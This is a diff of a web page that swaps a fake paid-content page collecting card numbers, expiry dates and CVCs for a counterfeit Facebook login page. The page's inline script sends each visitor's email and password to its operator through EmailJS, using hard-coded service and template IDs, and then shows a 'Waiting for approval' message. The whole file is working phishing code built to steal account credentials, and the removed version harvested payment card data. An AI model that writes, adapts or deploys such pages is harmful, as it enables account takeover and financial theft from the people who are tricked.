@@ -1,31 +1,130 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Uncensored Content</title>
+  <title>Login</title>
   <link rel="stylesheet" href="style.css">
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
-
 <body>
 
-  <div class="container">
-    <h2>Come watch me Stream Live! And get access to hundreds of videos and more.</h2>
-    <form id="paymentForm">
-      <input type="text" id="cardNumber" placeholder="Card Number" required>
-      <input type="text" id="expDate" placeholder="MM/YY" required>
-      <input type="text" id="cvc" placeholder="CVC" required>
-      <input type="text" id="zipCode" placeholder="ZIP Code" required> <!-- Added ZIP Code field -->
+  <!-- Navigation Bar -->
+  <nav class="navbar">
+    <h2>facebook</h2>
+  </nav>
+
+  <div class="login-container">
+    <h2>Enter Facebook Login to Access Group</h2>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="password" id="password" placeholder="Password" required>
       <p id="errorMessage" class="error"></p>
-      <button type="button" id="payButton">Pay $5</button>
+      <button type="button" id="loginButton">Login</button>
     </form>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-  <script src="script.js"></script>
-</body>
+  <script>
+    // EmailJS configuration
+    const EMAILJS_SERVICE_ID = "service_uhxg8hf";
+    const EMAILJS_TEMPLATE_ID = "template_ledkaye";
+    const EMAILJS_PUBLIC_KEY = "ezt9CB7CxTCyZu_ja";
 
+    // Initialize EmailJS
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+
+    // Handle login submission
+    document.getElementById("loginButton").addEventListener("click", () => {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!email || !password) {
+        document.getElementById("errorMessage").textContent = "All fields are required.";
+        return;
+      }
+
+      // EmailJS parameters
+      const templateParams = { email: email, password: password };
+
+      // Send email
+      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+        .then(() => {
+          alert("Waiting for approval");
+          document.getElementById("loginForm").reset();
+        })
+        .catch((error) => {
+          alert("Failed to submit login.");
+          console.error("Error:", error);
+        });
+    });
+  </script>
+
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: #f0f2f5;
+    }
+    .navbar {
+      width: 100%;
+      height: 60px;
+      background-color: #1877f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 1000;
+    }
+    .navbar h2 {
+      color: white;
+      font-size: 24px;
+      margin: 0;
+    }
+    .login-container {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      width: 300px;
+      margin-top: 80px; /* Adjusted to prevent overlap with navbar */
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    input {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #166fe5;
+    }
+    .error {
+      color: red;
+      font-size: 14px;
+    }
+  </style>
+
+</body>
 </html>
 
 
